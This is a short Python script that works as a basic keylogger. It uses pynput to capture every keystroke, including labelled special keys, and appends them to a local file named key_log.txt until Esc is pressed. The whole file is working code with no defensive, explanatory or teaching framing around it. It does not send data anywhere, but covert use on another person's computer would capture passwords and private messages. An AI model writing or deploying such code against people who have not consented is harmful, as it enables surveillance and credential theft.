from pynput.keyboard import Listener

# File to store the logs
log_file = "key_log.txt"

# Function to write keystrokes to the log file
def on_press(key):
    try:
        # Convert the key to a string and write it to the file
        with open(log_file, "a") as f:
            f.write(str(key.char))
    except AttributeError:
        # Handle special keys (like space, shift, etc.)
        with open(log_file, "a") as f:
            if key == key.space:
                f.write(" [SPACE] ")
            elif key == key.enter:
                f.write(" [ENTER]\n")
            elif key == key.backspace:
                f.write(" [BACKSPACE] ")
            else:
                f.write(f" [{str(key).replace('Key.', '').upper()}] ")

# Function to stop the listener (optional)
def on_release(key):
    if key == key.esc:
        # Stop the listener when 'esc' key is pressed
        return False

# Setup the listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
